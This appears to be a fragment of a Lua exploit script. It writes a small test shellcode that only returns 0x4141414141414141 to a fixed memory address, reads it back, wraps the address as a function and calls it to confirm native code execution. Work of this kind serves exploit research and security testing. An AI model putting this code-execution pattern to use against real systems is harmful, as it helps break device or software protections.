
--mov rax, 0x4141414141414141
local shellcode = "48b84141414141414141C3"
write_shellcode(SHELLCODE_BASE, shellcode)

send_notification(to_hex(read64(SHELLCODE_BASE)))
send_notification(to_hex(read64(SHELLCODE_BASE + 8)))

local shellcode_test = func_wrap(SHELLCODE_BASE)

send_notification(to_hex(shellcode_test()))
